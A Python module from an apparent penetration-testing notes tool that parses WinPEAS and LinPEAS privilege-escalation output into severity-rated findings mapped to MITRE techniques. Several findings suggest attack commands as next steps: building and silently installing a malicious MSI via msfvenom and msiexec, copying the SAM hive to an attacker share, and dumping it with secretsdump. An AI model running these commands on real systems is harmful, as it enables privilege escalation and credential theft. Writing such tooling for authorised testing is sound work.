"""WinPEAS and LinPEAS privilege-escalation parser."""

from __future__ import annotations

import re
from pathlib import PurePosixPath, PureWindowsPath

from pentnote.core.deduplicator import finding_hash
from pentnote.models import Finding, MitreMatch, ParsedResult, Severity
from pentnote.parsers.base import AbstractParser

WINPEAS_STRONG = (
    "ADVISORY: winPEAS",
    "winPEAS",
    "Interesting Services",
    "Modifiable Services",
    "Unquoted Service Path",
    "AlwaysInstallElevated",
    "SYSTEM processes",
)
LINPEAS_STRONG = (
    "ADVISORY: linPEAS",
    "linPEAS",
    "SUID Binary",
    "Sudo version",
    "CVE-",
    "╔══════════╣",
)
EXPLOITABLE_SUID = {"bash", "vim", "python", "find", "nmap", "perl", "ruby", "tar"}


class WinPEASParser(AbstractParser):
    """Parse WinPEAS privilege-escalation findings."""

    tool_name = "winpeas"
    aliases = ("winpeas-ng",)
    supported_extensions = (".txt", ".log", ".ans")

    def can_parse(self, content: str) -> float:
        clean = self.clean(content)
        if any(signal in clean for signal in WINPEAS_STRONG):
            return 0.9
        return 0.0

    def parse(self, content: str) -> ParsedResult:
        clean = self.clean(content)
        findings = _dedupe_findings(_winpeas_findings(clean))
        return ParsedResult(
            self.tool_name,
            partial=False,
            hosts=[],
            credentials=[],
            findings=findings,
            domain_objects=[],
            raw_text=content,
        )


class LinPEASParser(AbstractParser):
    """Parse LinPEAS privilege-escalation findings."""

    tool_name = "linpeas"
    aliases = ("linpeas-ng",)
    supported_extensions = (".txt", ".log", ".ans")

    def can_parse(self, content: str) -> float:
        clean = self.clean(content)
        if "winpeas" in clean.casefold():
            return 0.0
        if "cve-" in clean.casefold() and not any(
            signal in clean for signal in LINPEAS_STRONG if signal != "CVE-"
        ):
            return 0.0
        if any(signal in clean for signal in LINPEAS_STRONG):
            return 0.9
        return 0.0

    def parse(self, content: str) -> ParsedResult:
        clean = self.clean(content)
        findings = _dedupe_findings(_linpeas_findings(clean))
        return ParsedResult(
            self.tool_name,
            partial=False,
            hosts=[],
            credentials=[],
            findings=findings,
            domain_objects=[],
            raw_text=content,
        )


def _winpeas_findings(content: str) -> list[Finding]:
    findings: list[Finding] = []
    lines = content.splitlines()
    for index, line in enumerate(lines):
        lowered = line.casefold()
        if "unquoted service path" in lowered:
            service = _service_name(line) or _service_name(_next_line(lines, index))
            findings.append(
                _finding(
                    tool="winpeas",
                    title=f"Unquoted Service Path: {service or 'Unknown Service'}",
                    severity=Severity.HIGH,
                    technique_id="T1574.009",
                    technique_name="Path Interception by Unquoted Path",
                    tactic="Persistence",
                    evidence=_block(lines, index),
                )
            )
        if "alwaysinstallelevated" in lowered and "yes" in lowered:
            findings.append(
                _finding(
                    tool="winpeas",
                    title="AlwaysInstallElevated Enabled",
                    severity=Severity.HIGH,
                    technique_id="T1548.002",
                    technique_name="Bypass User Account Control",
                    tactic="Privilege Escalation",
                    evidence=line.strip(),
                    next_steps=[
                        "msfvenom -p windows/exec CMD=cmd.exe -f msi > evil.msi",
                        "msiexec /quiet /qn /i evil.msi",
                    ],
                )
            )
        if "modifiable service" in lowered:
            service = _service_name(line) or _service_name(_next_line(lines, index))
            findings.append(
                _finding(
                    tool="winpeas",
                    title=f"Modifiable Service: {service or 'Unknown Service'}",
                    severity=Severity.HIGH,
                    technique_id="T1543.003",
                    technique_name="Windows Service",
                    tactic="Persistence",
                    evidence=_block(lines, index),
                )
            )
        if "sam" in lowered and "readable" in lowered:
            findings.append(
                _finding(
                    tool="winpeas",
                    title="SAM Database Readable",
                    severity=Severity.CRITICAL,
                    technique_id="T1003.002",
                    technique_name="Security Account Manager",
                    tactic="Credential Access",
                    evidence=line.strip(),
                    next_steps=[
                        r"copy SAM \\attacker\share\SAM",
                        "secretsdump.py -sam SAM -security SECURITY LOCAL",
                    ],
                )
            )
        if _credential_file_line(line):
            findings.append(
                _finding(
                    tool="winpeas",
                    title="Credentials Found in File",
                    severity=Severity.MEDIUM,
                    technique_id="T1552.001",
                    technique_name="Credentials In Files",
                    tactic="Credential Access",
                    evidence=line.strip(),
                )
            )
    return findings


def _linpeas_findings(content: str) -> list[Finding]:
    findings: list[Finding] = []
    lines = content.splitlines()
    for line in lines:
        lowered = line.casefold()
        suid_binary = _suid_binary(line)
        if suid_binary in EXPLOITABLE_SUID:
            findings.append(
                _finding(
                    tool="linpeas",
                    title=f"Exploitable SUID: {suid_binary}",
                    severity=Severity.HIGH,
                    technique_id="T1548.001",
                    technique_name="Setuid and Setgid",
                    tactic="Privilege Escalation",
                    evidence=line.strip(),
                    next_steps=["GTFObins: https://gtfobins.github.io/#+suid"],
                )
            )
        if "nopasswd" in lowered:
            command = _nopasswd_command(line)
            severity = Severity.CRITICAL if "ALL" in command.upper() else Severity.HIGH
            findings.append(
                _finding(
                    tool="linpeas",
                    title=f"Sudo NOPASSWD: {command}",
                    severity=severity,
                    technique_id="T1548.003",
                    technique_name="Sudo and Sudo Caching",
                    tactic="Privilege Escalation",
                    evidence=line.strip(),
                )
            )
        for cve_id in re.findall(r"CVE-\d{4}-\d{4,7}", line, flags=re.I):
            findings.append(
                _finding(
                    tool="linpeas",
                    title=f"CVE Detected: {cve_id.upper()}",
                    severity=_peas_severity(line),
                    technique_id="T1068",
                    technique_name="Exploitation for Privilege Escalation",
                    tactic="Privilege Escalation",
                    evidence=line.strip(),
                )
            )
        if "world-writable" in lowered and "cron" in lowered:
            findings.append(
                _finding(
                    tool="linpeas",
                    title="World-Writable Cron File",
                    severity=Severity.HIGH,
                    technique_id="T1053.003",
                    technique_name="Cron",
                    tactic="Persistence",
                    evidence=line.strip(),
                )
            )
        if "/etc/shadow" in lowered and "readable" in lowered:
            findings.append(
                _finding(
                    tool="linpeas",
                    title="Shadow File Readable",
                    severity=Severity.CRITICAL,
                    technique_id="T1003.008",
                    technique_name="/etc/passwd and /etc/shadow",
                    tactic="Credential Access",
                    evidence=line.strip(),
                )
            )
    return findings


def _finding(
    *,
    tool: str,
    title: str,
    severity: Severity,
    technique_id: str,
    technique_name: str,
    tactic: str,
    evidence: str,
    next_steps: list[str] | None = None,
) -> Finding:
    return Finding(
        title=title,
        severity=severity,
        mitre_matches=[MitreMatch(technique_id, technique_name, tactic, 0.9, "rule")],
        affected_hosts=[],
        evidence=evidence,
        next_steps=next_steps or [],
        defenses=[],
        chain_member=None,
        hash=finding_hash(tool, "", title),
    )


def _dedupe_findings(findings: list[Finding]) -> list[Finding]:
    deduped: dict[str, Finding] = {}
    for finding in findings:
        deduped.setdefault(finding.hash, finding)
    return list(deduped.values())


def _service_name(line: str) -> str:
    unquoted = re.search(
        r"unquoted service path\s*[:=]\s*([A-Za-z0-9_.-]+)", line, re.I
    )
    if unquoted:
        return unquoted.group(1)
    match = re.search(
        r"(?:service(?:name)?|name)\s*[:=]\s*([A-Za-z0-9_.-]+)",
        line,
        re.I,
    )
    if match:
        return match.group(1)
    return ""


def _next_line(lines: list[str], index: int) -> str:
    return lines[index + 1] if index + 1 < len(lines) else ""


def _block(lines: list[str], index: int) -> str:
    return "\n".join(line.strip() for line in lines[index : index + 3]).strip()


def _credential_file_line(line: str) -> bool:
    lowered = line.casefold()
    if "password" not in lowered and "credential" not in lowered:
        return False
    return "\\" in line or "/" in line or ".config" in lowered or ".ini" in lowered


def _suid_binary(line: str) -> str:
    lowered = line.casefold()
    if "suid" not in lowered:
        return ""
    path_match = re.search(r"(/[^\s]+)", line)
    if path_match:
        return PurePosixPath(path_match.group(1)).name.casefold()
    win_path_match = re.search(r"([A-Za-z]:\\[^\s]+)", line)
    if win_path_match:
        return PureWindowsPath(win_path_match.group(1)).name.casefold()
    return ""


def _nopasswd_command(line: str) -> str:
    match = re.search(r"NOPASSWD:\s*(.+)$", line, re.I)
    return match.group(1).strip() if match else "unknown"


def _peas_severity(line: str) -> Severity:
    lowered = line.casefold()
    if "critical" in lowered:
        return Severity.CRITICAL
    if "medium" in lowered:
        return Severity.MEDIUM
    if "low" in lowered:
        return Severity.LOW
    return Severity.HIGH
